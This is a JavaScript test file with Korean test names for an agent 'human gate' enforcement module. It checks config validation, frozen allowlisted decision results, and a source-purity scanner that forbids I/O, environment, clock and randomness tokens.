describe('설정 이상값 — 강제 안 함 + configErrors 노출', () => {
  const base = { enabled: true, mode: 'enforce', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] };
  const input = { tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json') };

  it.each([
    ['미지 mode', { ...base, mode: 'enforcee' }, 'config-invalid'],
    ['미지 게이트 id', { ...base, gates: ['HG-99', 'HG-13'] }, 'config-invalid'],
    ['미지 키(오타)', { ...base, enabeld: true }, 'config-invalid'],
    ['gates 비배열', { ...base, gates: 'HG-13' }, 'config-invalid'],
    ['enabled 비불리언', { ...base, enabled: 'true' }, 'enforce-disabled'],
  ])('%s → record', (_label, enforce, reason) => {
    const result = decide({ ...input, config: configWith(enforce) });
    expect(result.decision).toBe('record');
    expect(result.reason).toBe(reason);
    expect(result.configErrors.length).toBeGreaterThan(0);
  });

  it('enforce 가 null 이면 오류를 노출하고 강제하지 않는다', () => {
    const result = decide({ ...input, config: configWith(null) });
    expect(result.decision).toBe('record');
    expect(result.configErrors).toEqual(['enforce: must be an object']);
  });
});

describe('validateEnforceConfig', () => {
  const valid = { enabled: false, mode: 'shadow', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] };

  it('반환 배열은 frozen 이다 (N3) — validateEnforceConfig 와 evaluateMatrix 모두', () => {
    for (const enforce of [undefined, null, valid, { ...valid, mode: 'x' }]) {
      expect(Object.isFrozen(validateEnforceConfig(enforce))).toBe(true);
    }
    for (const input of [null, { tool: 'Bash', command: 'terraform apply' }, { tool: 'Bash', command: 'npm -v' }]) {
      expect(Object.isFrozen(evaluateMatrix(input))).toBe(true);
    }
  });

  it('정상 설정·부분 설정·부재(undefined)는 위반 0', () => {
    expect(validateEnforceConfig(valid)).toEqual([]);
    expect(validateEnforceConfig({ enabled: true })).toEqual([]);
    expect(validateEnforceConfig({})).toEqual([]);
    expect(validateEnforceConfig({ ...valid, gates: ['HG-07', 'HG-12', 'HG-13'], enabled: true, mode: 'enforce' })).toEqual([]);
    expect(validateEnforceConfig(undefined)).toEqual([]);
  });

  it.each([
    ['미지 게이트 id', { ...valid, gates: ['HG-99'] }, 'HG-99'],
    ['매트릭스엔 있으나 판정 대상 아님', { ...valid, gates: ['HG-01'] }, 'not enforceable'],
    ['중복 게이트', { ...valid, gates: ['HG-12', 'HG-12'] }, 'duplicate'],
    ['비문자열 게이트', { ...valid, gates: [12] }, 'gates[0]'],
    ['gates 비배열', { ...valid, gates: 'HG-12' }, 'gates'],
    ['미지 mode', { ...valid, mode: 'enforcee' }, 'enforcee'],
    ['비불리언 enabled', { ...valid, enabled: 'yes' }, 'enabled'],
    ['askHonoredModes 비배열', { ...valid, askHonoredModes: 'default' }, 'askHonoredModes'],
    ['askHonoredModes 빈 문자열', { ...valid, askHonoredModes: [''] }, 'askHonoredModes[0]'],
    ['미지 키', { ...valid, enabeld: true }, 'enabeld'],
    ['비객체', 'on', 'object'],
    ['배열', [], 'object'],
  ])('%s → 거부', (_label, enforce, needle) => {
    const errors = validateEnforceConfig(enforce);
    expect(errors.length).toBeGreaterThan(0);
    expect(errors.join('\n')).toContain(needle);
  });

  it('matrix 인자를 따른다 — 매트릭스에 없는 id 는 미지 게이트', () => {
    const matrix = HUMAN_GATE_MATRIX.filter((row) => row.id !== 'HG-07');
    expect(validateEnforceConfig({ ...valid, gates: ['HG-07'] }, matrix).join('\n')).toContain('unknown gate id');
  });
});

describe('결과 모양 · 어휘 allowlist', () => {
  it('상수 어휘가 고정돼 있다', () => {
    expect(ENFORCE_DECISIONS).toEqual(['pass', 'record', 'ask', 'deny']);
    expect(ENFORCEABLE_GATE_IDS).toEqual(['HG-07', 'HG-12', 'HG-13']);
    expect(ENFORCE_CONFIG_PATH).toEqual(['permissions', 'humanGates', 'enforce']);
    const matrixIds = HUMAN_GATE_MATRIX.map((row) => row.id);
    for (const id of ENFORCEABLE_GATE_IDS) expect(matrixIds).toContain(id);
  });

  it('모든 표 결과는 frozen 이고 결정·사유가 allowlist 안에 있다', () => {
    const inputs = [
      ...[...HG12_POSITIVE, ...HG12_NEGATIVE, ...HG13_POSITIVE, ...HG13_NEGATIVE].map(([, input]) => input),
      ...[...HG07_POSITIVE, ...HG07_NEGATIVE].map(([, command]) => ({ tool: 'Bash', command })),
    ];
    for (const input of inputs) {
      const result = decide(input);
      expect(Object.isFrozen(result)).toBe(true);
      expect(Object.isFrozen(result.hits)).toBe(true);
      expect(Object.isFrozen(result.configErrors)).toBe(true);
      expect(ENFORCE_DECISIONS).toContain(result.decision);
      expect(ENFORCE_DECISIONS).toContain(result.wouldDecide);
      expect(ENFORCE_REASONS).toContain(result.reason);
      for (const hit of result.hits) {
        expect(Object.isFrozen(hit)).toBe(true);
        expect(ENFORCE_REASONS).toContain(hit.reason);
      }
    }
  });
});

// ── 순수성 핀 ──────────────────────────────────────────────────────────────

const FORBIDDEN_IN_PURE_SOURCE = [
  ['process.', /\bprocess\s*\./],
  ['require(', /\brequire\s*\(/],
  ['dynamic import(', /\bimport\s*\(/],
  ["from 'node:*'", /\bfrom\s*['"]node:/],
  ["from 'fs'|'path'|'os'|'child_process'", /\bfrom\s*['"](?:fs|path|os|child_process)(?:\/[a-z]+)?['"]/],
  ['Date', /\bDate\b/],
  ['Math.random', /\bMath\s*\.\s*random\b/],
  ['globalThis', /\bglobalThis\b/],
];

/** 블록·줄 주석을 지운다. `://` 뒤의 `//` 는 주석으로 보지 않는다. */
const stripComments = (source) => source
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/(^|[^:\\])\/\/[^\n]*/g, '$1');

const scanPurity = (source) => {
  const code = stripComments(source);
  return FORBIDDEN_IN_PURE_SOURCE.filter(([, re]) => re.test(code)).map(([label]) => label);
};

describe('순수성 핀 — I/O·env·시계·난수·node 내장 로딩 0', () => {
  it.each([
    ['human-gate-enforce.js'],
    ['human-gate-curl.js'],
  ])('%s 소스(주석 제거 후)에 금지 토큰이 없다', (file) => {
    const source = readFileSync(new URL(`../../lib/security/${file}`, import.meta.url), 'utf8');
    expect(source.length).toBeGreaterThan(1000);
    expect(scanPurity(source)).toEqual([]);
  });

  it('human-gate-curl.js 는 아무것도 import 하지 않는다', () => {
    const source = readFileSync(new URL('../../lib/security/human-gate-curl.js', import.meta.url), 'utf8');
    expect(stripComments(source)).not.toMatch(/^\s*import\b/m);
  });

  it('스캐너 자기검증 — 깨진 합성 소스에서 각 금지 토큰을 잡는다', () => {
    const broken = [
      ['process.', 'const a = process.env.CLAUDE_PLUGIN_ROOT;'],
      ['require(', "const fs = require('fs');"],
      ['dynamic import(', "const m = await import('./x.js');"],
      ["from 'node:*'", "import { readFileSync } from 'node:fs';"],
      ["from 'fs'|'path'|'os'|'child_process'", "import path from 'path';"],
      ['Date', 'const now = new Date();'],
      ['Math.random', 'const r = Math.random();'],
      ['globalThis', 'const g = globalThis.x;'],
    ];
    for (const [label, source] of broken) {
      expect(scanPurity(source)).toEqual([label]);
    }
  });

  it('스캐너 자기검증 — 주석 속 언급은 잡지 않고, 주석 뒤 코드는 잡는다', () => {
    expect(scanPurity('/* process.env */ const x = 1;\n// new Date()\nconst y = 2;')).toEqual([]);
    expect(scanPurity('// process.env\nconst x = process.cwd();')).toEqual(['process.']);
    expect(scanPurity("const u = 'http://x'; const d = new Date();")).toEqual(['Date']);
  });
});
